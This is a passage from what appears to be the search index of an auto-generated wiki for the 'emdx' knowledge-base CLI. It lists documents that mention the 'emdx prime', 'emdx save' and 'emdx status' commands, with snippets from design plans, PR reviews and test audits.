failures\" feature for `emdx prime` as described in the gameplan (Document #6545). This feature adds a RECENT FAILURES section to prime output showing failed delegate executions from the last 24 hours...\n\n- **#6554** Implementation: Add Recent Failures to emdx prime (Issue #FEAT-7)\n  *Section: Summary*\n  &gt; Successfully implemented the \"RECENT FAILURES\" section for `emdx prime` output as described in gameplan #6542. This feature shows failed delegate executions from the last 24 hours, helping agents understand what went wrong recently and...\n\n- **#6546** Delegate Enhancement Gameplans [synthesis]\n  *Section: Key Findings by Feature*\n  &gt; **Priority Logic:**\n1. In-progress tasks (finish what you started)\n2. Ready tasks (unblocked work)\n3. Stale gameplans tagged active (&gt;7 days)\n4. Fallback to `emdx prime`\n\n- **#6545** Delegate Enhancement Gameplans [1/5]\n  *Section: Executive Summary*\n  &gt; `emdx next` returns THE single next action for Claude Code to take, reducing decision fatigue at session start. It prioritizes finishing in-progress work, then ready tasks, then stale gameplans, with a fallback to `emdx prime`/`emdx status`.\n\n- **#6542** Delegate Enhancement Gameplans [5/5]\n  *Section: Overview*\n  &gt; Add a \"RECENT FAILURES\" section to `emdx prime` output that shows failed delegate executions from the last 24 hours. This helps agents understand what went wrong recently and provides retry commands.\n\n- **#6536** EMDX Future Directions: Agent-First Design [synthesis]\n  *Section: Actionable Next Steps*\n  &gt; **This week:**\n1. Implement `emdx next` \u2014 lowest effort, highest impact\n2. Add `--retry` to delegate \u2014 simple wrapper around execute()\n3. Add recent failures to `emdx prime` output\n\n- **#6535** EMDX Future Directions: Agent-First Design [4/4]\n  *Section: What Works Well Today*\n  &gt; 1. **Session Priming (`emdx prime`)**: Injects work context at session start \u2014 ready tasks, epics, recent docs\n2. **Delegate System**: Replaces Claude Code's Task sub-agents with persistent, searchab...\n\n- **#6533** EMDX Future Directions: Agent-First Design [1/4]\n  *Section: 1. Session Handoff Friction*\n  &gt; ### Current State\n- `emdx prime` outputs ready tasks, in-progress tasks, and recent docs\n- `emdx status` shows delegate activity and recent completions\n- `emdx briefing` provides activity summaries\n\n- **#6521** Delegate synthesis [synthesis]\n  *Section: Task 1: FEAT-5 Smart Priming (PR #446)*\n  &gt; PR #446 implemented a `--smart` flag for `emdx prime` with context-aware features. The PR was **closed without merging** on 2026-02-15. Most features have since been **implemented via alternative approaches**. Only git...\n\n- **#6477** EMDX Task System: Unified Architecture and Simplification Strategy\n  *Section: Implementation Roadmap*\n  &gt; ### Week 3: Documentation &amp; Migration\n1. Update `emdx prime` to show only manual tasks\n2. Simplify task instructions in CLAUDE.md to ~10 lines\n3. Consider migration script for existing tasks\n4. Test with Claude Code sessions\n\n- **#6472** EMDX Task System: Architecture, Data Model, and Integration\n  *Section: Best Practices*\n  &gt; 4. **Monitoring**: Use `emdx status` and `emdx prime` for live task visibility\n\n- **#6395** Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]\n  *Section: Agent Patterns*\n  &gt; **Search Behavior:**\n- Exact terms: `emdx find \"SEC-42\"` or doc IDs\n- Tag filters: `emdx find --tags \"gameplan,active\" --json`\n- ID-based access: `emdx view 123 --no-pager --raw`\n- Pre-session priming: `emdx prime --format json`\n\n- **#6386** Delegate: Research how Claude Code specifically works as an agent \u2014 wh [3/4]\n  *Section: emdx Integration Opportunities*\n  &gt; - **SessionStart hook**: Auto-run `emdx prime` for work context\n- **PostToolUse hook**: Auto-save significant outputs to emdx\n- **PreCompact hook**: Trigger emdx save of important context before compaction\n- **T...\n\n- **#6308** Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]\n  *Section: 1. Command Redundancy - HIGH IMPACT*\n  &gt; **Status/Prime overlap:**\n- `emdx status` and `emdx prime` have significant overlap - both show tasks, cascade queue, and execution state\n- **Suggestion:** Merge into single command with `--json`/`--verbose` flags for different use cases\n\n- **#6236** Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]\n  *Section: 5. MISSING CLI INTEGRATION TESTS*\n  &gt; ...ll-all|health|monitor`\n4. `emdx gist create`\n5. `emdx maintain wizard|cleanup`\n6. `emdx prime` with all output formats\n7. `emdx task add|ready|done|list|delete`\n8. `emdx ai search|context|index|similar|stats|clear`\n\n- **#6222** Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]\n  *Section: Commands with no CLI integration tests:*\n  &gt; ...lth check output |\n| `emdx exec monitor` | \u274c Missing | Test monitoring output |\n| `emdx prime` | \u274c Missing | Test context output |\n| `emdx gist *` | \u274c Missing | Test with mocked gh CLI |\n\n- **#6191** Delegate: analysis [3/3]\n  *Section: Claude Code Integration*\n  &gt; EMDX is designed as a companion tool for Claude Code sessions:\n- `emdx prime` - Get current work context at session start\n- `emdx delegate` - Replace Task tool sub-agents (results persist)\n- `emdx task` - Work queue management\n- Auto-tagging...\n\n- **#6185** Gameplan: Simplify Task System for Agent Use\n  *Section: Filtering: Separate Agent Tasks from Delegate Activity*\n  &gt; ### Update `emdx prime`\n- Ready tasks section stays (already works)\n- In-progress section: filter to manual tasks only\n- Remove stale instructions about `task show`, `task run`, etc.\n\n- **#6180** Delegate: Task System Comprehensive Analysis [15/15]\n  *Section: Activity Tracking Dashboard*\n  &gt; The task system provides visibility into delegate activity:\n- `emdx status` shows active delegate tasks with child progress\n- `emdx prime` surfaces ready tasks at session start\n- Task history preserved even after execution completes\n\n- **#6178** Delegate: Research task management CLI tools and how they work alongsi [10/15]\n  *Section: Unique Value (Keep)*\n  &gt; 1. **Gameplan linkage**: Tasks tied to documents creates bidirectional value\n2. **`task ready`**: Dependency-aware ready queue works with `emdx prime`\n3. **`task run`**: Seamless Claude execution via delegate\n\n- **#6167** Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]\n  *Section: Integration Gap*\n  &gt; The CLAUDE.md instructs Claude to:\n- Run `emdx prime` at session start (shows tasks CLI-side)\n- Use `emdx task ready` to find actionable work\n- Create tasks for discovered work via `emdx task create`\n\n- **#6164** Delegate: Audit CLAUDE.md (578 lines) for accuracy. Check: (1) does it [6/17]\n  *Section: Stale References Summary*\n  &gt; ...d`, `emdx list`, `emdx view`, `emdx recent`\n- `emdx tag add/remove/list/legend`\n- `emdx prime`, `emdx status`\n- `emdx task create/ready/...`\n- `emdx delegate` (with all documented flags)\n- `emdx cascade add/status/process/run/advance/remove/synthesize`\n- `emd...\n\n- **#6161** Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]\n  &gt; # Analysis: Task Usage in `prime` and `status` Commands\n\n## Overview\n\nThe `prime` and `status` commands both surface task information but serve **different purposes** and query **different task schemas**. ---\n\n## `emdx prime` \u2014 Session Context Inject...\n\n- **#6146** Delegate: Review PR #446 (Smart Priming). Run: gh pr diff 446. Check c [1/7]\n  *Section: PR #446 Review: Smart Priming (`emdx prime --smart`)*\n  &gt; ## Summary\nPR adds `--smart` flag to `emdx prime` command implementing context-aware priming per gameplan #6099.\n\n- **#6099** Gameplan #3: Smart Priming\n  *Section: User Experience*\n  &gt; ### Current (dumb prime):\n```bash\nemdx prime\n# Returns: recent docs for detected project, static format\n</code></pre> <ul> <li> <p>#6094 EMDX Feature Deep Dive - Claude-First Design   Section: FEATURE 1: Smart Priming (<code>emdx prime --smart</code>)</p> <p><code>emdx prime</code> exists but it's generic \u2014 same output regardless of context.</p> </li> <li> <p>#6092 PROZE/EMDX Feature Exploration - 10 Paths Deep Dive   Section: PATH 6: Context-Aware Priming \u2014 Smart Session Bootstrap</p> </li> <li>Look at the git repo you're in</li> <li>Look at recent commits/changes</li> <li>Semantically search KB for relevant context</li> <li>Inj...</li> </ul>"},{"location":"entities/emdx-prime/#what-it-is","title":"What it is","text":"<p><code>emdx prime</code> already exists but it's static. Make it SMART:</p>"},{"location":"entities/emdx-prime/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx next</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.4)</li> <li><code>prime.sh</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.4)</li> <li><code>parent_task_id is null</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.4)</li> <li><code>text output</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.4)</li> <li><code>task update</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.4)</li> <li><code>task show</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.4)</li> <li><code>task run</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.4)</li> <li><code>task retry</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.4)</li> <li><code>emdx status</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=4.1)</li> <li><code>emdx task ready</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.1)</li> </ul>"},{"location":"entities/emdx-save/","title":"emdx save","text":"<p>Type: tech_term | Mentioned in: 36 documents | First seen: 2025-07-07</p>"},{"location":"entities/emdx-save/#documents-36","title":"Documents (36)","text":"<ul> <li>#6868 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/emdx-save/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: Changes made:</p> <p>Removed (stale): - Entire <code>emdx group</code> section (~140 lines) \u2014 command no longer exists - <code>--group</code> and <code>--group-role</code> flags from <code>emdx save</code> options</p> <ul> <li>#6867 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/emdx-save/#synthes-24","title":"Synthes [2/4]","text":"<p>Section: Summary</p> <p>...nd that no longer exists 3. Removed stale <code>--group</code>/<code>--group-role</code> flags from <code>emdx save</code> options 4. Updated <code>emdx gist</code> section \u2014 Added missing <code>--desc</code>, <code>--open</code>, <code>--update</code> flags with examples 5. Added <code>--cross-project</code> flag to <code>emdx save</code> doc...</p> <ul> <li>#6865 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/emdx-save/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Summary</p> <ol> <li>Deleted <code>--group, -g INTEGER</code> and <code>--group-role TEXT</code> from the <code>emdx save</code> options (2 lines)</li> <li>Deleted the entire <code>\ud83d\udcc1 Document Groups</code> section \u2014 all of <code>emdx group create/add/remove/list/show/edit/delete</code> (~140 lines)</li> <li>**Removed `gro...</li> </ol> <ul> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/cli-api.md</p> <p>1. STALE: <code>emdx save</code> content priority order is wrong (line 14) Doc says: <code>stdin &gt; --file &gt; positional argument</code> Actual (<code>emdx save --help</code>): <code>--file &gt; stdin &gt; positional argument</code></p> </li> <li> <p>#6809 Delegate: Fix DOC-10: Add mention of maintain.auto_link_on_save config [5/5]</p> <p>```bash</p> </li> </ul>"},{"location":"entities/emdx-save/#note-emdx-save-auto-links-new-docs-by-default-auto-link-no-auto-link","title":"Note: <code>emdx save</code> auto-links new docs by default (--auto-link/--no-auto-link).","text":""},{"location":"entities/emdx-save/#configure-via-maintainauto_link_on_save-setting","title":"Configure via <code>maintain.auto_link_on_save</code> setting.","text":"<pre><code>\n- **#6776** Auto-Wiki Architecture \u2014 Synthesized Research\n  *Section: Incremental Regeneration*\n  &gt; ...er | When | What | Cost |\n|---------|------|------|------|\n| On-save hook | Every `emdx save` | Mark affected articles stale (SQL only) | $0 |\n| On-demand refresh | `emdx wiki generate --stale` | Re-synthesize stale articles (fingerprint-gated) | $0.05-0.15/...\n\n- **#6775** Wiki Generation Architecture Research [synthesis]\n  *Section: TL;DR*\n  &gt; 3. **$0 on save, pay on refresh.** Staleness marking happens instantly on every `emdx save`. The user controls when to spend money on regeneration. Full wiki costs ~$0.45; monthly maintenance ~$8-25.\n\n- **#6753** Delegate synthesis [synthesis]\n  *Section: Synthesis Complete*\n  &gt; The full synthesis was written to `/tmp/obsidian-synthesis.md` and is ready to save to the knowledge base (pending approval for `emdx save`).\n\n- **#6717** Wiki Generation Architecture Research [4/10]\n  *Section: Executive Summary*\n  &gt; The emdx knowledge base (687 docs, ~38 MB, growing daily via `emdx save` and `emdx delegate`) needs a dynamic auto-wiki that stays current without full regeneration. After analyzing the existing codebase \u2014 entity extraction, TF-IDF clust...\n\n- **#6714** Wiki Generation Architecture Research [10/10]\n  *Section: Recommendation: Lazy invalidation*\n  &gt; When `emdx save` runs, mark affected wiki articles as \"stale\" rather than regenerating. This follows the existing pattern at `core.py:257-294` where wikify/entity/auto-link run post-save as lightweight operations:\n\n- **#6661** Prime Command Redesign Research [2/3]\n  *Section: Section-by-section classification*\n  &gt; ...ourages creating new tasks when the sub-agent should just do its job. `emdx find`/`emdx save` are the only relevant ones | `harmful-for-subagent` |\n| **ACTIVE EPICS** (full prime) | ~6 | **Useful** \u2014 project orientation | **Noise** \u2014 a sub-agent fixing a log...\n\n- **#6649** Delegate: README Tools-It-Replaces Angle [3/10]\n  *Section: emdx*\n  &gt; ...u used to need | emdx equivalent |\n|---|---|\n| **Notes app** (Notion, Obsidian) | `emdx save`, `emdx find`, `emdx tag` |\n| **Task tracker** (Linear, GitHub Issues) | `emdx task add`, `emdx task ready`, `emdx task epic` |\n| **RAG pipeline** (LangChain, custom...\n\n- **#6647** Delegate: Document #6643 (README Rewrite Strategy for 0.19.0): Before/After Contrast [2/10]\n  *Section: The fix*\n  &gt; ...s the root cause | Claude finds the root cause |\n| Session ends. Findings gone. | `emdx save` \u2014 findings persisted |\n| | `emdx delegate` \u2014 3 agents audit related code |\n| | `emdx task add` \u2014 remaining work tracked |\n| Next day: start from scratch | Next day:...\n\n- **#6569** Delegate: Check the KB save path \u2014 trace from UnifiedExecutor output t [3/3]\n  *Section: 1. Agent Instructions (`_run_single` in `delegate.py:513-518`)*\n  &gt; The agent is instructed to:\n1. Write output to a `/tmp/emdx-delegate-{file_id}.md` file\n2. Run `emdx save` on that file with title and tags\n3. Report the document ID\n\n- **#6567** Delegate synthesis [synthesis]\n  *Section: 4. Output Pipeline*\n  &gt; 1. Agent writes to `/tmp/emdx-delegate-{file_id}.md`\n2. Agent saves via `emdx save` with tags\n3. Fallback: delegate reads output file and saves if agent didn't\n4. All outputs tagged `needs-review` for triage\n5. Synthesis (if enabled) prints only th...\n\n- **#6552** Delegate: Review PR #655 using 'gh pr view 655' and 'gh pr diff 655'.  [3/6]\n  *Section: PR Description*\n  &gt; Added comprehensive test coverage for the `--task` and `--done` flags in `emdx save` command. These flags were implemented in PR #649 but lacked test coverage.\n\n- **#6538** Delegate: Add missing tests for the --task and --done flags in emdx sa [1/3]\n  *Section: Summary*\n  &gt; Added comprehensive tests for the `--task` and `--done` flags in the `emdx save` command. These flags were implemented in PR #649 to allow linking saved documents to tasks and optionally marking those tasks as done.\n\n- **#6527** Delegate: Review GitHub PR #649 using 'gh pr view 649' and 'gh pr diff [4/4]\n  *Section: Summary*\n  &gt; This PR adds two new flags to `emdx save`:\n- `--task &lt;id&gt;`: Links saved document to a task as its output (`output_doc_id`)\n- `--done`: Marks the linked task as done (requires `--task`)\n\n- **#6410** Delegate: Research and design structured metadata for emdx save and de [2/2]\n  *Section: CLI Interface Changes*\n  &gt; ### `emdx save` additions:\n```bash\n--confidence high|medium|low    # Agent self-assessment\n--source-task 123               # Link to originating task\n--session-id UUID               # Claude session (auto-detected)\n</code></pre> <ul> <li>#6397 Delegate: Design a concrete 'dual-interface' architecture for EMDX whe [2/3]   Section: Current Strength: stdin Piping <p>EMDX already handles this well:</p> </li> </ul> <pre><code>echo \"content\" | emdx save --title \"Note\"\ncat file.md | emdx save --title \"Doc\"\n</code></pre> <ul> <li> <p>#6343 Delegate: Claude-Save Hook Implementation [12/12]   Section: Completed Implementation</p> <p>Successfully implemented a Claude Code hook that intercepts and validates <code>emdx save</code> commands.</p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 2. Overly Complex Parameter Signatures</p> <p><code>emdx save</code> command (14 parameters): ``` --title, --project, --tags, --group, --group-role, --auto-tag, --suggest-tags, --supersede, --gist, --public, --secret, --copy, --ope...</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 5. MISSING CLI INTEGRATION TESTS</p> <p>...ntegration tests: | Command | Tested | Missing | |---------|--------|---------| | <code>emdx save</code> | Basic save | <code>--auto-tag</code>, <code>--supersede</code>, stdin piping | | <code>emdx find</code> | Basic search | <code>--sort</code>, <code>--limit</code>, <code>--offset</code>, <code>--project</code> | | <code>emdx delegate</code> | Unit te...</p> </li> <li> <p>#6222 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: Commands with partial CLI tests:</p> Command Current Coverage Gaps <code>emdx save</code> Help/error only Success path, stdin input, --tags flag <code>emdx find</code> Help only Actual search results, output formatting <code>emdx view</code> Help only Docu... </li> <li> <p>#6164 Delegate: Audit CLAUDE.md (578 lines) for accuracy. Check: (1) does it [6/17]   Section: Stale References Summary</p> <p>...erified CLI Commands All other commands in the document were verified to exist:</p> </li> <li><code>emdx save</code>, <code>emdx find</code>, <code>emdx list</code>, <code>emdx view</code>, <code>emdx recent</code></li> <li><code>emdx tag add/remove/list/legend</code></li> <li><code>emdx prime</code>, <code>emdx status</code></li> <li><code>emdx task create/ready/...</code></li> <li> <p>`emdx deleg...</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Doc ID Connection</p> <p>The agent is instructed to save output via <code>emdx save</code>, which creates a doc. The <code>extract_output_doc_id()</code> function parses the log to find this doc_id, then it's stored in the task.</p> </li> <li> <p>#6158 Delegate: analysis [5/5]   Section: Key Features</p> </li> <li>Save: Files, stdin, direct text \u2192 <code>emdx save</code></li> <li>Search: Full-text FTS5 search \u2192 <code>emdx find</code></li> <li>View/Edit: Document lifecycle management</li> <li> <p>Tags: Emoji-based tagging with text aliases</p> </li> <li> <p>#6150 Delegate: Review PR #448 (Contextual Save). Run: gh pr diff 448. Check [2/7]   Section: Gameplan #6097 Compliance</p> <p>...| <code>emdx check</code> command (pre-save advisory) | \u2705 Implemented | | <code>--smart</code> flag on <code>emdx save</code> | \u2705 Implemented | | Similarity thresholds (&gt;80% duplicate, 50-80% related, &lt;50% new) | \u2705 Implemented | | Tag suggestions from neighbors (top 3 docs) | \u2705 Implemented...</p> </li> <li> <p>#6139 Delegate: Read gameplan by running: emdx view 6097. Implement the Cont [1/7]   Section: What was implemented:</p> <ol> <li>New <code>--smart</code> flag on <code>emdx save</code> - Baked-in duplicate detection that:</li> </ol> </li> <li>Checks for similar docs after save</li> <li>Shows warning with similar doc IDs and similarity scores</li> <li> <p>Suggests tags from neighbors if no explicit tags provided</p> </li> <li> <p>#6098 Gameplan #2: Auto-Linking on Save   Section: User Experience</p> </li> </ul>"},{"location":"entities/emdx-save/#1-core-knowledge-base","title":"1. Core Knowledge Base","text":""},{"location":"entities/emdx-save/#on-save","title":"On save:","text":"<p>```bash echo \"research on auth patterns\" | emdx save --title \"Auth Patterns\"</p>"},{"location":"entities/emdx-save/#saved-6100-auth-patterns","title":"\u2713 Saved #6100 \"Auth Patterns\"","text":""},{"location":"entities/emdx-save/#linked-to","title":"\ud83d\udd17 Linked to:","text":""},{"location":"entities/emdx-save/#6045-api-security-notes-82-similar","title":"#6045 \"API Security Notes\" (82% similar)","text":""},{"location":"entities/emdx-save/#6023-architecture-decisions-67-similar","title":"#6023 \"Architecture Decisions\" (67% similar)...","text":"<ul> <li> <p>#6097 Gameplan #1: Contextual Save   Section: Gameplan #1: Contextual Save (Duplicate Prevention)</p> </li> <li> <p>#6094 EMDX Feature Deep Dive - Claude-First Design   Section: FEATURE 2: Auto-Linking on Save</p> </li> <li>Embed the new document</li> <li>Find top 3-5 most similar existing docs</li> <li>Store the links as metadata</li> <li> <p>Display them in the save output</p> </li> <li> <p>#6092 PROZE/EMDX Feature Exploration - 10 Paths Deep Dive   Section: PATH 3: Auto-Linking \u2014 Knowledge Graph Emergence</p> </li> </ul>"},{"location":"entities/emdx-save/#vision","title":"Vision","text":"<p>Every <code>emdx save</code> becomes intelligent \u2014 before creating a new doc, it checks the KB for overlap and guides the user (Claude) to update existing docs instead of creating duplicates.</p>"},{"location":"entities/emdx-save/#the-solution","title":"The Solution","text":"<p>After every <code>emdx save</code>, automatically:</p>"},{"location":"entities/emdx-save/#cli-usage","title":"CLI Usage","text":"<p>```bash</p>"},{"location":"entities/emdx-save/#save-a-doc-automatically-shows-related-docs","title":"Save a doc \u2192 automatically shows related docs","text":"<p>echo \"New auth research\" | emdx save --title \"Auth Research\" --tags \"research\"</p>"},{"location":"entities/emdx-save/#output-saved-as-6092","title":"Output: Saved as #6092","text":""},{"location":"entities/emdx-save/#related-6045-oauth-implementation-82-6031-session-design-71","title":"Related: #6045 \"OAuth Implementation\" (82%), #6031 \"Session Design\" (71%)","text":"<ul> <li>#293 emdx Tag System Implementation Plan   Section: 3. Save Enhancement </li> </ul>"},{"location":"entities/emdx-save/#update-emdx-save-to-accept-tags","title":"Update <code>emdx save</code> to accept tags","text":"<p>```python</p>"},{"location":"entities/emdx-save/#in-emdxcorepy","title":"In emdx/core.py","text":"<p>@cli.command() @click.option('--tags', '-t', help='Comma-separated tags') def save(file_path: str, title: str = None, pro...</p> <ul> <li>#1 SQLite Migration Plan for emdx   Section: 4. Migration Strategy </li> <li>Just works! No setup needed</li> <li>Database created on first <code>emdx save</code></li> </ul>"},{"location":"entities/emdx-save/#for-new-users","title":"For new users:","text":""},{"location":"entities/emdx-save/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx tag</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.6)</li> <li><code>emdx maintain analyze</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.6)</li> <li><code>tests/test_save_task_flags.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.6)</li> <li><code>emdx maintain wiki</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.6)</li> <li><code>~$8-25</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> <li><code>workflow integration design</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> <li><code>why it matters for claude</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> <li><code>vision every</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> <li><code>--done</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.3)</li> <li><code>--group-role</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.2)</li> </ul>"},{"location":"entities/emdx-status/","title":"emdx status","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdx-status/#documents-12","title":"Documents (12)","text":"<ul> <li>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: How <code>emdx status</code> Currently Shows Running Delegates <p><code>emdx status</code> doesn't query the <code>executions</code> table at all. It uses the tasks table via <code>get_active_delegate_tasks()</code> (status.py:78). Each active task shows:</p> </li> <li> <p>Task ID, type (...</p> </li> <li> <p>#6591 Delegate: Research what an 'emdx init' command should do for first-run [2/4]   Section: Current emdx State</p> <p>emdx already has implicit initialization:</p> </li> <li>Database auto-creates on first use (<code>~/.config/emdx/knowledge.db</code>)</li> <li>Schema migrations run automatically</li> <li>No explicit init command exists</li> <li> <p><code>emdx prime</code> and <code>emdx status</code> work immediately after install</p> </li> <li> <p>#6545 Delegate Enhancement Gameplans [1/5]   Section: Executive Summary</p> <p><code>emdx next</code> returns THE single next action for Claude Code to take, reducing decision fatigue at session start. It prioritizes finishing in-progress work, then ready tasks, then stale gameplans, with a fallback to <code>emdx prime</code>/<code>emdx status</code>.</p> </li> <li> <p>#6533 EMDX Future Directions: Agent-First Design [1/4]   Section: 1. Session Handoff Friction</p> </li> <li><code>emdx prime</code> outputs ready tasks, in-progress tasks, and recent docs</li> <li><code>emdx status</code> shows delegate activity and recent completions</li> <li> <p><code>emdx briefing</code> provides activity summaries</p> </li> <li> <p>#6477 EMDX Task System: Unified Architecture and Simplification Strategy   Section: Phase 2: Separate Concerns</p> <p>Delegate Activity (internal tracking):</p> </li> <li>Keep existing tracking for <code>emdx status</code></li> <li>Parent/child hierarchies for parallel/chain</li> <li>Execution linking for monitoring</li> <li> <p>Not exposed in simplified task API</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Best Practices</p> <ol> <li>Monitoring: Use <code>emdx status</code> and <code>emdx prime</code> for live task visibility</li> </ol> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 1. Command Redundancy - HIGH IMPACT</p> <p>Status/Prime overlap:</p> </li> <li><code>emdx status</code> and <code>emdx prime</code> have significant overlap - both show tasks, cascade queue, and execution state</li> <li> <p>Suggestion: Merge into single command with <code>--json</code>/<code>--verbose</code> flags for different use cases</p> </li> <li> <p>#6185 Gameplan: Simplify Task System for Agent Use   Section: Problem</p> <p>The task system serves two conflicting purposes:</p> </li> <li>Delegate activity tracking \u2014 internal bookkeeping for <code>emdx status</code></li> <li> <p>Agent work queue \u2014 Claude Code creating/consuming work items across sessions</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Best Practices</p> <p>...dx task retry ` for failed tasks instead of recreating <li>Monitoring: Use <code>emdx status</code> for live view of active/failed tasks</li> <li>Context: Link to gameplans via <code>gameplan_id</code> for rich prompt context</li> <li> <p>Dependencies: Model task dependencies explic...</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Activity Tracking Dashboard</p> <p>The task system provides visibility into delegate activity:</p> </li> <li><code>emdx status</code> shows active delegate tasks with child progress</li> <li><code>emdx prime</code> surfaces ready tasks at session start</li> <li> <p>Task history preserved even after execution completes</p> </li> <li> <p>#6164 Delegate: Audit CLAUDE.md (578 lines) for accuracy. Check: (1) does it [6/17]   Section: Stale References Summary</p> <p>...<code>,</code>emdx view<code>,</code>emdx recent`</p> </li> <li><code>emdx tag add/remove/list/legend</code></li> <li><code>emdx prime</code>, <code>emdx status</code></li> <li><code>emdx task create/ready/...</code></li> <li><code>emdx delegate</code> (with all documented flags)</li> <li><code>emdx cascade add/status/process/run/advance/remove/synthesize</code></li> <li> <p>`emdx recipe list/r...</p> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]</p> <p>It does NOT show delegate activity tasks. ---</p> </li>"},{"location":"entities/emdx-status/#current-state","title":"Current State","text":""},{"location":"entities/emdx-status/#emdx-status-delegate-activity-index","title":"<code>emdx status</code> \u2014 Delegate Activity Index","text":"<p>Purpose: Show active/recent delegate (AI agent) execution activity. Task data surfaced:</p> <p>1.</p>"},{"location":"entities/emdx-status/#related-entities","title":"Related Entities","text":"<ul> <li><code>task lifecycle</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>single tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>type='single'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>type='group'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>type='chain'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>task types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>dependency system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>chain tasks</code> 